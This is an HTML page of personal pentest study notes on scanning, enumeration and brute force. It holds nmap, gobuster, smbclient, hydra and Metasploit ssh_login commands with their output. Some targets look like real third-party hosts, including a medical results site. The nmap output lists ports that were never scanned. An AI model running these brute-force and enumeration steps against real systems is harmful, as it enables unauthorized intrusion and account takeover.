@@ -1,0 +1,293 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self'; img-src 'self' data:; connect-src https://cloudflareinsights.com; base-uri 'none'; form-action 'none'">
+<meta name="referrer" content="no-referrer">
+<meta name="description" content="Scanning &amp; enumeration — nota do Cyber Expert Guide.">
+<title>Scanning &amp; enumeration · Teia</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%230a0a0a'/%3E%3Ctext x='16' y='23' font-family='Georgia,serif' font-size='17' font-weight='700' text-anchor='middle' fill='%23cf6a24'%3EJC%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="../styles.css?v=e6e699ca">
+</head>
+<body>
+<header class="site">
+  <a class="wordmark" href="../index.html">CYBER<span>/</span>EXPERT GUIDE</a>
+  <nav aria-label="Seções">
+    <a href="../">Home</a>
+    <a href="../guia.html">Guia</a>
+    <a href="../roadmap.html">Roadmaps</a>
+    <a href="../trilhas.html">Trilhas</a>
+    <a href="../artigos.html" aria-current="page">Artigos</a>
+    <details class="nav-group">
+      <summary>Recursos</summary>
+      <div class="nav-menu">
+        <a href="../canivete.html">Canivete suíço</a>
+        <a href="../solucoes.html">HUB Sec</a>
+        <a href="../checklist.html">Checklist</a>
+        <a href="../plataformas.html">Plataformas</a>
+
+        <a href="../eventos.html">Eventos</a>
+        <a href="../radar.html">Radar</a>
+        <a href="../noticias.html">Notícias</a>
+      </div>
+    </details>
+    <a href="../sugestoes.html">Sugestões</a>
+  </nav>
+</header>
+<main class="wrap">
+  <p class="crumb"><a href="../teia.html">&larr; Teia</a></p>
+  <article class="sec-g prose">
+    <h1>Scanning &amp; enumeration</h1>
+    
+    <p>Type: <a href="cyber.html" class="wl">Cyber</a> <span class="wl-missing">Hacking</span><br>Skills: <a href="linux.html" class="wl">Linux</a></p>
+<p>If we are into the network, we can run the command below with the subnet address:</p>
+<pre><code> netdiscover -r 192.168.44.0/24
+</code></pre>
+<h4>Class about <a href="nmap.html" class="wl">Nmap</a></h4>
+<h4>Nikto</h4>
+<p>Is know as a web vulnerability scanner, this is a great tool when we learning the beginning stuff when we are practicing against phone hub, CTF, HTB etc... </p>
+<pre><code>nikto -h https://example.com
+</code></pre>
+<p>-h =  target host</p>
+<p>====================================================<br>Comentário em português...</p>
+<p>Quando usamos NMAP ou Nikto e descobrimos algumas portas abertas, precisamos pensar sobre o ponto de vista de ataque assim como um atacante e temos que ter a nossa própria metodologia para saber por onde começar e vamos adotar uma metodologia 'low hanging fruit' que significa começar pelo óbvio, pelo fácil... então se temos uma resposta do nmap como essa:</p>
+<p>jayce@jayce-ubuntu-sandbox:~$ nmap -T4 -Pn -p 80,264,443 189.39.66.249<br>Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-03 21:06 -03<br>Nmap scan report for 189.39.66.249<br>Host is up.</p>
+<p>PORT    STATE    SERVICE<br>80/tcp  filtered http<br>264/tcp filtered bgmp<br>443/tcp open https<br>22/tcp   filtered ssh<br>445/tcp open smb<br>139/tcp open netbios</p>
+<p>A porta 22 do serviço SSH é uma boa pedida para começarmos a explorar, mas a priori vamos ter que realizar algumas técnicas como brute force ou password spraying e isso pode levar um tempo, as portas 445 SMB, 139 Netbios já foram usadas muitas vezes para ataques e são portas comuns de acharmos exploits, em 2017 e 2020 temos WannaCry e EternalBlue usando essas portas para ataque. SMB tem um péssimo histórico assim como sites webs... mas vamos começar pelo 'juiciest first' ... Se vemos um website vamos abrir esse website em um navegador e ver o comportamento do HTTP e HTTPS.  </p>
+<p>Visualizar uma página padrão é automaticamente uma descoberta (finding). É explorável? Não, mas diz muito sobre a arquitetura, tecnologia usada e muito sobre a questão cyber hygiene da empresa. Podemos achar algum link na página que nos leva a uma página não encontrada e se não for um retorno tratado pode levar informações do servidor, versão e nome e chamamos isso de 'information disclosure e version enumeration'. Com o nome nos poderíamos potencialmente saber como é a utilização de nomes convencionais da rede interna da empresa.</p>
+<p>=============================================================</p>
+<h4>Gobuster is a tool used to brute-force:</h4>
+<p>URIs (directories and files) in web sites.<br>DNS subdomains (with wildcard support).<br>Virtual Host names on target web servers.<br>Open Amazon S3 buckets<br>Open Google Cloud buckets<br>TFTP servers</p>
+<p>command  I used:</p>
+<pre><code>gobuster -u http://189.39.67.27 -w /usr/share/wordlists/node-dirbuster/lists/d
+irectory-list-2.3-small.txt
+
+gobuster -a &quot;Mozilla/5.0 (plataform, rv:geckoversion) Gecko/geckotrail Firefox/firefox version&quot; -u https://sislu.dasa.com.br -w /usr/share/wordlists/node-dirbuster/lists/slh-test.txt -fw
+
+##The output
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : https://sislu.dasa.com.br/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/node-dirbuster/lists/slh-test.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] User Agent   : Mozilla/5.0 (plataform, rv:geckoversion) Gecko/geckotrail Firefox/firefox version
+[+] Timeout      : 10s
+=====================================================
+2023/11/04 11:00:10 Starting gobuster
+=====================================================
+2023/11/04 11:00:10 [-] Wildcard response found: https://sislu.dasa.com.br/9a4ef22a-6be8-44c2-aa24-7671322ccbe1 =&gt; 403
+//sislu/slh/laudo.do?chave=DdDDdzHBVf&amp;pedido=4944986 (Status: 403)
+//sislu/slh/laudo.do?chave=Hjdbsidfjh&amp;pedido=2466846 (Status: 403)
+//sislu/slh/laudo.do?chave=Hjdbsidfjh&amp;pedido=2466846 (Status: 403)
+//sislu/slh/laudo.do?chave=Hjdbsidfjh&amp;pedido=2466846 (Status: 403)
+</code></pre>
+<h4>MSFCONSOLE</h4>
+<p>What is MSF in Metasploit?</p>
+<p>The MSF is an open-source tool, which provides a framework for security researchers to develop exploits, payloads, payload encoders, and tools for reconnaissance and other security testing purposes.</p>
+<p>Command I used:</p>
+<pre><code>$ msfconsole
+msf6&gt; search smb
+msf6 &gt; use /auxiliary/scanner/smb/smb_version
+msf6 &gt; info
+msf6 &gt; options
+msf6 &gt; set RHOSTS 192.168.44.131
+msf6 &gt; run
+##OUTPUT WITH THE VERSION
+</code></pre>
+<h4>SMB </h4>
+<p>SMB is <b>a network file sharing protocol that requires an open port on a computer or server to communicate with other systems</b>. SMB ports are generally port numbers 139 and 445. Port 139 is used by SMB dialects that communicate over NetBIOS</p>
+<p>Command I used:</p>
+<pre><code>smbclient -L \\\\192.168.44.131\\
+</code></pre>
+<p>If we can authenticated with anonymous login.. We will display de sharename lists</p>
+<h4>SSH</h4>
+<p><b>Port 22 is a well-known port number used in computer networking</b>. It is specifically associated with the Secure Shell (SSH) protocol, which is commonly used for secure remote administration and secure file transfer over an unsecured network. If we have a unique possibility to insert a password, so this is a exploitation. So we can use this command:</p>
+<pre><code>ssh 192.168.44.131
+##OUTPUT
+Unable to negotiate no matcheing cipher found. Their offer: aes128-cbc.....
+
+ssh 192.168.44.131 -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc
+##OUTUPUT BANNER
+</code></pre>
+<p>In this case we are searching for a banner, sometimes the server display us some company name or ssh version.<br><b>About the command I used in the ssh `<code>'-oKeXAlgorithms=+'</code>` is not common but this also useful</b></p>
+<h4>Research potential vulnerabilities </h4>
+<p>We can use google or <code>searchsploit</code> command to search potential vulns..</p>
+<h3>Brute force Attacks</h3>
+<p>Command I used:</p>
+<pre><code>hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.44.131:22 -t 4 -V
+</code></pre>
+<p>And Metasploit I used:</p>
+<pre><code>┌──(root㉿kali)-[/home/blackhacker]
+└─# msfconsole                                                                                         
+                                                  
+
+Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f                                                                                                                                                              
+EFLAGS: 00010046                                                                                                                                                                                                                            
+eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001                                                                                                                                                                                     
+esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60                                                                                                                                                                                     
+ds: 0018   es: 0018  ss: 0018                                                                                                                                                                                                               
+Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)                                                                                                                                                                                 
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+Stack: 90909090990909090990909090                                                                                                                                                                                                           
+       90909090990909090990909090                                                                                                                                                                                                           
+       90909090.90909090.90909090                                                                                                                                                                                                           
+       90909090.90909090.90909090                                                                                                                                                                                                           
+       90909090.90909090.09090900                                                                                                                                                                                                           
+       90909090.90909090.09090900                                                                                                                                                                                                           
+       ..........................                                                                                                                                                                                                           
+       cccccccccccccccccccccccccc                                                                                                                                                                                                           
+       cccccccccccccccccccccccccc                                                                                                                                                                                                           
+       ccccccccc.................                                                                                                                                                                                                           
+       cccccccccccccccccccccccccc                                                                                                                                                                                                           
+       cccccccccccccccccccccccccc                                                                                                                                                                                                           
+       .................ccccccccc                                                                                                                                                                                                           
+       cccccccccccccccccccccccccc                                                                                                                                                                                                           
+       cccccccccccccccccccccccccc                                                                                                                                                                                                           
+       ..........................                                                                                                                                                                                                           
+       ffffffffffffffffffffffffff                                                                                                                                                                                                           
+       ffffffff..................                                                                                                                                                                                                           
+       ffffffffffffffffffffffffff                                                                                                                                                                                                           
+       ffffffff..................                                                                                                                                                                                                           
+       ffffffff..................                                                                                                                                                                                                           
+       ffffffff..................                                                                                                                                                                                                           
+                                                                                                                                                                                                                                            
+
+Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00
+Aiee, Killing Interrupt handler
+Kernel panic: Attempted to kill the idle task!
+In swapper task - not syncing                                                                                                                                                                                                               
+
+
+       =[ metasploit v6.2.20-dev                          ]
++ -- --=[ 2251 exploits - 1187 auxiliary - 399 post       ]
++ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Use help &lt;command&gt; to learn more 
+about any command
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 &gt; search ssh
+
+Matching Modules
+================
+
+   #   Name                                                        Disclosure Date  Rank       Check  Description
+   -   ----                                                        ---------------  ----       -----  -----------
+   0   exploit/linux/http/alienvault_exec                          2017-01-31       excellent  Yes    AlienVault OSSIM/USM Remote Code Execution
+
+.
+.
+.
+.
+libssh Authentication Bypass Scanner
+   73  exploit/linux/http/php_imap_open_rce                        2018-10-23       good       Yes    php imap_open Remote Code Execution
+
+
+Interact with a module by name or index. For example info 73, use 73 or use exploit/linux/http/php_imap_open_rce
+
+msf6 &gt; use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; options
+
+Module options (auxiliary/scanner/ssh/ssh_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&amp;realm)
+   PASSWORD                           no        A specific password to authenticate with
+   PASS_FILE                          no        File containing passwords, one per line
+   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT             22               yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads (max one per host)
+   USERNAME                           no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password for all users
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           false            yes       Whether to print output for all attempts
+
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; set pass_file 
+pass_file =&gt; 
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+pass_file =&gt; /usr/share/wordlists/metasploit/unix_passwords.txt
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; set rhost 192.168.44.131
+rhost =&gt; 192.168.44.131
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; set username root
+username =&gt; root
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; options
+
+Module options (auxiliary/scanner/ssh/ssh_login):
+
+   Name              Current Setting                                     Required  Description
+   ----              ---------------                                     --------  -----------
+   BLANK_PASSWORDS   false                                               no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                   yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                               no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                               no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                               no        Add all users in the current database to the list
+   DB_SKIP_EXISTING  none                                                no        Skip existing credentials stored in the current database (Accepted: none, user, user&amp;realm)
+   PASSWORD                                                              no        A specific password to authenticate with
+   PASS_FILE         /usr/share/wordlists/metasploit/unix_passwords.txt  no        File containing passwords, one per line
+   RHOSTS            192.168.44.131                                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT             22                                                  yes       The target port
+   STOP_ON_SUCCESS   false                                               yes       Stop guessing when a credential works for a host
+   THREADS           1                                                   yes       The number of concurrent threads (max one per host)
+   USERNAME          root                                                no        A specific username to authenticate as
+   USERPASS_FILE                                                         no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                                               no        Try the username as the password for all users
+   USER_FILE                                                             no        File containing usernames, one per line
+   VERBOSE           false                                               yes       Whether to print output for all attempts
+
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; run
+
+[*] 192.168.44.131:22 - Starting bruteforce
+^C[*] Caught interrupt from the console...
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; set verbose true
+verbose =&gt; true
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; run
+
+[*] 192.168.44.131:22 - Starting bruteforce
+[-] 192.168.44.131:22 - Failed: 'root:admin'
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.44.131:22 - Failed: 'root:123456'
+[-] 192.168.44.131:22 - Failed: 'root:12345'
+[-] 192.168.44.131:22 - Failed: 'root:123456789'
+^C[*] Caught interrupt from the console...
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; set threads 10
+threads =&gt; 10
+msf6 auxiliary(scanner/ssh/ssh_login) &gt; run
+
+[*] 192.168.44.131:22 - Starting bruteforce
+[-] 192.168.44.131:22 - Failed: 'root:admin'
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.44.131:22 - Failed: 'root:123456'
+[-] 192.168.44.131:22 - Failed: 'root:12345'
+
+</code></pre>
+<h3>Credential Stuffing and Password Spraying</h3>
+<h4>What is credential Stuffing?</h4>
+<p>Injecting breached account credentials in hopes of account takeover.</p>
+<p>In this case we used Burp Suite to brute force some accounts, and here is one tip.... In this Tesla case, the return always was status code 200, so we read the payload and found 'we could not sign you', so now to help us with the return is positive or not, we insert the sentence in 'Grep - Match' ... This is the result:</p>
+<p></p>
+<h4>What is Password Spraying?</h4>
+<p>A Password Spraying Attack is a type of brute force attack where a malicious actor attempts the same password on many accounts before moving on to another one and repeating the process. This is effective because many users use simple, predictable passwords, such as &quot;password123.&quot;</p>
+    
+    <p class="art-meta art-foot">Nota do meu segundo cérebro (Obsidian), publicada aqui. Conteúdo próprio.</p>
+  </article>
+</main>
+<footer class="site-foot"><div class="wrap"><p>&copy; 2026 Julio Cataldo. <span class="foot-quote">&ldquo;Dedicated to safeguarding digital frontiers, navigating the cyber realms with resilience, and championing cybersecurity as a cornerstone of our digital future.&rdquo;</span></p></div></footer>
+</body>
+</html>
